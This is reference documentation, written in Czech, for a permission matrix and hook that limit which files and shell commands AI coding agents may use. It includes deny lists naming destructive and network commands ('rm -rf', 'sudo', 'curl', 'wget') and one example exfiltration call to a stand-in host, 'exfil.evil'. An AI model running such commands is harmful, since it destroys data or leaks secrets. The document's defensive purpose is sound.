# Permissions — referenční dokumentace

**Účel tohoto dokumentu:** popsat, **co** je v permission matrix, **jak** ji hook enforcuje, a **jak** přidat nového agenta nebo upravit pravidla bez rozbití bezpečnostní hranice.

Pro **proč** hook-based enforcement viz [ADR-0005](../DECISIONS.md). Pro **co** jsou JSON Signals (typed agent communication) viz [ADR-0007](../DECISIONS.md).

---

## 1. Soubory

| Cesta | Účel |
|---|---|
| [`.opencode/permissions.yaml`](../../.opencode/permissions.yaml) | Allow/deny matrix per agent (single source of truth). |
| [`.opencode/hooks/permission-gate.mjs`](../../.opencode/hooks/permission-gate.mjs) | Pre-tool-use hook. Načte env vars, vyhledá pattern, exit 0/1. |
| [`.opencode/hooks/post-tool-use.mjs`](../../.opencode/hooks/post-tool-use.mjs) | Post-tool-use hook. Audit + token counter. Vždy exit 0. |
| [`tools/test-permissions.mjs`](../../tools/test-permissions.mjs) | Smoke test 33 scenarios napříč agenty. `pnpm test:permissions`. |
| `factory-logs/permission-audit.jsonl` | Per-call audit log (write/deny outcome + reason). |
| `factory-logs/tool-events.jsonl` | Per-call event stream consumed by dashboard SSE feed. |

---

## 2. Sémantika matchování

Hook při každém volání čte 3 env vars:

| Env var | Hodnota |
|---|---|
| `FACTORY_AGENT` | jméno agenta (např. `frontend-builder`) |
| `OPENCODE_TOOL_NAME` | `write` nebo `bash` |
| `OPENCODE_TOOL_RESOURCE` | path (pro `write`) nebo command string (pro `bash`) |

Resolution order **(deny wins)**:

1. **Deny patterns** — projdi všechny patterns v `agents.<name>.<tool>.deny`. Pokud match, exit 1, log denial.
2. **Allow patterns** — projdi `agents.<name>.<tool>.allow`. Pokud match, exit 0, log allow.
3. **Default** — exit 1 (žádné pravidlo nepokrývá → implicit deny).

Patterns používají bash-style globs:

| Pattern | Matches |
|---|---|
| `spec/**` | `spec/foo`, `spec/foo/bar`, `spec/a/b/c.yaml` |
| `*.json` | jakýkoliv JSON soubor (i v subdir) |
| `git push *` | `git push`, `git push origin main`, `git push --force` |
| `npm *` | `npm install`, `npm run build`, `npm publish` |

Hook normalizuje `**` na `*` před matching — sémanticky ekvivalentní v naší implementaci (`*` v JS regex `[\s\S]*` matches anything, including `/`).

---

## 3. Wildcard deny: kdy ano, kdy ne

`deny: ["*"]` znamená "explicitně zakázat všechno". **Pro agenty s allow listem je redundantní** — default fallback (no match → deny) už dělá stejnou práci, a `*` v deny pohlcuje specific allow patterns.

**Pravidla:**

- `default` agent: má `deny: ["*"]` v obou `write` a `bash`. Záměrné — fail-closed pro neznámého agenta.
- Per-agent: **specific deny patterns** (např. `git push *`, `rm -rf *`, `sudo *`) — definují **dangerous things** which should be blocked even if a broader allow could accidentally match (e.g. `npm *` allow + `npm publish` deny).
- Pokud agent nemá co specificky zakázat, deny list nemá `*` — nepotřebné.

Příklad správné struktury (`frontend-builder`):

```yaml
frontend-builder:
  bash:
    allow:
      - "npm *"
      - "pnpm *"
      - "git add *"
      - "git commit *"
    deny:
      - "git push *"          # specific — overrides hypothetical "git *" allow
      - "rm -rf *"
      - "sudo *"
      - "curl *"
      - "wget *"
```

---

## 4. Audit log

Každé volání hooku zapíše JSON entry do `factory-logs/permission-audit.jsonl`:

```json
{"ts":"2026-04-28T10:32:14.221Z","agent":"frontend-builder","tool":"bash","resource":"git push origin main","result":"denied","reason":"matched deny rule \"git push *\""}
{"ts":"2026-04-28T10:32:14.834Z","agent":"frontend-builder","tool":"write","resource":".factory-state/workspace/src/pages/about.astro","result":"allowed","reason":"matched allow rule \".factory-state/workspace/**\""}
```

Audit log:

- **Append-only** — nikdy se nepřepisuje.
- **Per-factory-core** ne per-projekt — drží zaznamenané všech projektů. (Per-projekt audit log by se mohl přidat, pokud bude potřeba — zatím není.)
- **Best-effort** — log failure neblokuje tool call (write retry by zhoršoval performance).

Hooks samy o sobě **nečtou** audit log — slouží pro post-mortem (manuální debug, dashboard surface, zákazník audit).

---

## 5. Performance

Per-call overhead Node + js-yaml + match: typicky 30–80 ms cold start, < 10 ms hot.

Ve V1 každý tool call = fresh Node process (no daemon). Cold start je dominant. Při ~80 ms / call a 100 calls / iteration, total overhead je ~8 s / iteration. Na orchestrator iteration trvající 30–60 s je to < 15 % overhead — acceptable.

Když performance bude problem (Wave 5+, dashboard real-time):
1. Daemon mode hook (long-lived process listening on socket) — eliminuje startup.
2. Bash + yq fallback — viz BACKLOG, ARCHITECTURE.md §5.4 původně doporučovala.
3. Pre-compiled regex cache (file modified-time check, skip re-parse).

---

## 6. Jak přidat nového agenta

1. **Specifikace v `permissions.yaml`** — append novou entry do `agents:`:

   ```yaml
   <new-agent-name>:
     description: >-
       Krátké explanation co agent dělá.
     write:
       allow:
         - ".factory-state/artifacts/<owned-area>/**"
         - ".factory-state/logs/<new-agent-name>.jsonl"
       deny:
         - "spec/**"
         - ".factory-state/state.json"
         # ... další specificky nebezpečná místa
     bash:
       allow:
         - "<command pattern>"
         - "ls *"
         - "cat *"
       deny:
         - "rm -rf *"
         - "sudo *"
         # ... další dangerous commands
   ```

2. **Test scenarios v `tools/test-permissions.mjs`** — append minimum 1 positive a 1 negative scenario:

   ```js
   { label: "<new-agent> may write to its area",
     agent: "<new-agent-name>", tool: "write", resource: ".factory-state/artifacts/<area>/output.json",
     expect: 0 },
   { label: "<new-agent> may NOT write to spec",
     agent: "<new-agent-name>", tool: "write", resource: "spec/business.yaml",
     expect: 1 },
   ```

3. **Run tests:**

   ```bash
   pnpm test:permissions
   ```

   Všechny scenáře musí projít. Pokud nový agent nemá viable allow path, test odhalí.

4. **Doplnit do agent catalog v ARCHITECTURE.md §4.5** (pokud agent má novou roli).

5. **Commit** s message `feat(permissions): add <new-agent-name> permission entry`.

---

## 7. Jak změnit pravidla existujícího agenta

Změny v `permissions.yaml` jsou **breaking** pro běžící factory. Preferuj:

- **Aditivní změny** (add allow patterns) — bezpečné, agent získá novou capability.
- **Restriktivní změny** (add deny / remove allow) — ověř, že žádný probíhající projekt nepoužívá restricted operation. Jinak factory selže za běhu.

Workflow:

1. Edit `permissions.yaml`.
2. Update related test scenarios v `tools/test-permissions.mjs`.
3. `pnpm test:permissions` — všechny scenáře musí projít.
4. Restart běžících factories (`systemctl restart factory@<project-id>`) — hook re-read permissions.yaml každé volání, takže není nutné, ale orchestrátor potřebuje znovu spawnovat agents s aktuální matrix.

---

## 8. Co matrix **neřeší**

Hook permissions chrání proti:

- Agent nedopatřením přepisující spec / state / cross-project files.
- Agent halucinující dangerous shell commands (`rm -rf`, `sudo`, …).
- Confused deputy attacks via prompt injection (instrukce v assets).
- Misrouted tool calls (frontend-builder volá `git push`).

Nepokrývá:

- **Network egress** — agent volající `curl https://exfil.evil` přes allow `curl *` projde. Třeba doplnit specifikaci hostů v deny (např. `curl http://*` deny pro plain HTTP).
- **Resource exhaustion** — agent zacyklený v `pnpm install` cycle. To řeší token budget v `constraints.yaml` + post-tool-use token counter.
- **Side channels** — agent commitující sensitive content do allowed file paths. Audit log to zachytí post-hoc, ale neblokuje.
- **Prompt-level instructions** — agent může v vlastním system promptu mít "nikdy neudělej X". To je orthogonal — hook je infrastruktura, prompt je fallback edukace.

---

## 9. Schema validation matrix

Permission matrix nemá formal JSON Schema (V1 — manual review postačí). Sanity check pro každý agent:

```bash
# All agent entries have both write and bash
yq '.agents | to_entries | .[] | select(.value | (has("write") | not) or (has("bash") | not)) | .key' .opencode/permissions.yaml

# All allow/deny lists are non-null
yq '.agents | to_entries | .[] | {key: .key, write_allow: .value.write.allow, write_deny: .value.write.deny}' .opencode/permissions.yaml
```

(yq Mike Farah's verze — install: `wget -qO ~/bin/yq https://github.com/mikefarah/yq/releases/download/v4.44.5/yq_linux_amd64 && chmod +x ~/bin/yq`.)

Pokud matrix začne být chybová a chyby v ní by byly drahé, doplnit `permissions.schema.json`.
